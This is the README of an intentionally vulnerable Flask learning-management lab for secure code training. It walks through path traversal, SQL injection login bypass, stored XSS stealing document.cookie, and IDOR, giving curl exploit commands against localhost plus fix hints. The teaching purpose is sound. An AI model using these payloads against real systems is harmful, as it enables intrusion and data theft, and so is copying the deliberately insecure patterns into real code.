# SCA LMS Lab

A deliberately vulnerable Flask learning-management system for Secure Code
Analysis (SCA) training. Students are expected to **find each bug by reading the
source first**, then confirm it against the running app.

> **Warning:** This application is intentionally insecure. Run it only on a
> local teaching machine. Never deploy it to a shared or production network.

## What is inside

Four isolated vulnerabilities, each with a `# VULN:` comment that states the
**source**, the **sink**, and the **missing control**:

| # | Vulnerability | Route |
|---|---------------|-------|
| 1 | Path traversal | `GET /material` |
| 2 | SQL injection | `POST /login` |
| 3 | Stored XSS | `POST /course/<id>/description` -> `GET /course/<id>` |
| 4 | IDOR | `GET /enrollment/<id>` |

## Layout

```text
lms-lab/
├── app.py                  # every route, schema, DB helper, session handling
├── seed.py                 # users, courses, enrollments, material files
├── lms.db                  # created automatically on first run (gitignore this)
├── templates/
│   ├── base.html
│   ├── login.html
│   ├── dashboard.html
│   ├── course.html
│   └── enrollment.html
├── static/
│   └── style.css
├── materials/
│   ├── secret.txt          # copy of the flag in the materials root
│   ├── intro/
│   │   └── intro.txt
│   └── advanced/
│       ├── notes.txt
│       └── secret.txt      # FLAG{path_traversal_works}
└── README.md
```

## Setup and run

```bash
cd lms-lab
python3 -m venv .venv
source .venv/bin/activate
pip install flask
python app.py
```

Open <http://127.0.0.1:5000>. The SQLite database and seed data are created
automatically on the first run. `python seed.py` re-creates the original data at
any time (useful after changing the course description).

## Lab accounts

| Username | Password | Role | Enrolled in |
|----------|----------|------|-------------|
| `alice` | `alice123` | student | course 1 (`intro`) |
| `bob` | `bob123` | student | course 2 (`advanced`) |
| `inst` | `inst123` | instructor | none |

## Suggested workflow (source first)

1. Read `app.py` top to bottom. Trace each route from its input to its sink.
2. Search for the teaching comments:
   ```bash
   grep -n "VULN" app.py templates/course.html
   ```
3. Write down source, sink, and the control that is missing.
4. Only then run the matching `curl` command below to prove the issue.
5. Read the "Fix hint" and write the patched version of the route.

The app has no CSRF tokens, so `curl` can drive every form directly. The server
runs with `debug=True` on `127.0.0.1:5000`.

---

## VULN 1 - Path traversal in course materials

**Source:** `request.args.get("course")` and `request.args.get("file")` in
`app.py:230-231`.

**Sink:** `os.path.join(MATERIALS_DIR, course_name, filename)` passed to
`open()` in `app.py:233` / `app.py:238`.

**Missing control:** Resolve with `os.path.realpath()` and verify the result is
still inside `materials/<course>/` (for example with `startswith`) before
opening it.

**Exploit (as alice, enrolled only in `intro`):**

```bash
BASE=http://127.0.0.1:5000
COOKIE=/tmp/alice.cookie

curl -s -c "$COOKIE" \
  --data-urlencode "username=alice" \
  --data-urlencode "password=alice123" \
  "$BASE/login" -o /dev/null

# Read advanced/secret.txt even though alice is only in intro
curl -s -b "$COOKIE" \
  "$BASE/material?course=intro&file=../advanced/secret.txt"
# -> FLAG{path_traversal_works}

# Escape the materials directory entirely and read application source
curl -s -b "$COOKIE" \
  "$BASE/material?course=intro&file=../../app.py" | head -n 1
# -> import os
```

**Fix hint:** Reject or normalize `..` and require
`realpath(join(base, course, file)).startswith(realpath(join(base, course)) + os.sep)`.

---

## VULN 2 - SQL injection in login

**Source:** `request.form["username"]` and `request.form["password"]` in
`app.py:100-101`.

**Sink:** `get_db().execute(query)` in `app.py:114`, where `query` is built by
string concatenation at `app.py:107-113`.

**Missing control:** Use a parameterized query:
`execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))`.

**Exploit (no valid password needed):**

```bash
BASE=http://127.0.0.1:5000
COOKIE=/tmp/sqli.cookie

curl -s -i -c "$COOKIE" \
  --data-urlencode "username=' OR '1'='1' -- " \
  --data-urlencode "password=anything" \
  "$BASE/login" | grep -iE "HTTP/|Location"
# -> 302 ... Location: /dashboard

curl -s -b "$COOKIE" "$BASE/dashboard" | grep -o "alice" | head -n 1
# -> alice
```

**Fix hint:** Never concatenate user input into SQL; bind parameters instead.

---

## VULN 3 - Stored XSS in the course description

**Source:** the `description` textarea on the instructor's course page, handled
by `request.form.get("description")` in `app.py:213`.

**Sink:** `{{ course['description'] | safe }}` in `templates/course.html:11`.
The `| safe` filter disables Jinja2 autoescaping.

**Missing control:** Render with normal autoescaping (remove `| safe`), or
sanitize the HTML on input. Storage does not escape anything in `app.py:214-217`.

**Exploit (as `inst`, then view as any student):**

```bash
BASE=http://127.0.0.1:5000
INST=/tmp/inst.cookie
ALICE=/tmp/alice.cookie

curl -s -c "$INST" \
  --data-urlencode "username=inst" \
  --data-urlencode "password=inst123" \
  "$BASE/login" -o /dev/null

curl -s -b "$INST" -X POST \
  --data-urlencode 'description=<script>alert(document.cookie)</script>' \
  "$BASE/course/1/description" -o /dev/null

curl -s -c "$ALICE" \
  --data-urlencode "username=alice" \
  --data-urlencode "password=alice123" \
  "$BASE/login" -o /dev/null

curl -s -b "$ALICE" "$BASE/course/1" \
  | grep -F '<script>alert(document.cookie)</script>'
# -> the raw script tag is returned to every student
```

Open the course page in a browser to see `alert(document.cookie)` execute. Run
`python seed.py` to restore the original description.

**Fix hint:** Remove `| safe` (default escaping) and validate/sanitize any HTML
you actually intend to allow.

---

## VULN 4 - IDOR on enrollment records

**Source:** the `<int:enrollment_id>` path segment in `GET /enrollment/<id>`
(`app.py:248`).

**Sink:** `db.execute("SELECT * FROM enrollments WHERE id = ?", (enrollment_id,))`
in `app.py:253-255`, followed by rendering the student and course data.

**Missing control:** The query is parameterized and therefore safe from SQL
injection, but there is no ownership check such as
`if record["user_id"] != session["user_id"]: abort(403)`.

**Exploit (alice reads bob's enrollment):**

```bash
BASE=http://127.0.0.1:5000
COOKIE=/tmp/alice.cookie

curl -s -c "$COOKIE" \
  --data-urlencode "username=alice" \
  --data-urlencode "password=alice123" \
  "$BASE/login" -o /dev/null

# alice's own record is #1
curl -s -b "$COOKIE" "$BASE/enrollment/1" | grep "alice@example.com"

# bob's record is #2 - alice can read it by changing the id
curl -s -b "$COOKIE" "$BASE/enrollment/2" | grep "bob@example.com"
# -> bob@example.com
```

**Fix hint:** After fetching the record, compare `record["user_id"]` with the
session user (or add `AND user_id = ?` to the query) before returning it.

---

## Reset

```bash
# From lms-lab/ while the app is running (or stopped):
python seed.py
```

This restores the users, courses, enrollments, and material files, including
the flag. The SQLite file `lms.db` is created automatically if it is missing.

## Constraints honored by this lab

- One `app.py`, plus `seed.py`, templates, static assets, and materials.
- SQLite only; no external services, ORM, WAF, CSRF protection, or sanitizer.
- `debug=True` on `http://127.0.0.1:5000`.
- Exactly four intentional vulnerabilities, each isolated to one route.
